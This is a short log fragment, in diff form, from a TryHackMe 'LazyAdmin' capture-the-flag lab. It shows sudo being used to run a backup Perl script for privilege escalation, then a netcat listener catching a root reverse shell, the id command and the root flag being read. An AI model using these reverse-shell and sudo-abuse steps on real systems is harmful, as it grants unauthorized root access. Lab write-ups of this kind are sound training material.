@@ -1,0 +1,18 @@
+
+
+www-data@THM-Chal:/tmp$ sudo /usr/bin/perl /home/itguy/backup.pl
+sudo /usr/bin/perl /home/itguy/backup.pl
+
+
+
+root@kali:/opt/TryHackMe/lazyadmin# nc -nlvp 5554
+listening on [any] 5554 ...
+connect to [10.8.147.132] from (UNKNOWN) [10.10.207.191] 48280
+#
+#
+#
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+THM{6637f41d0177b6f37cb20d775124699f}
+# ^C
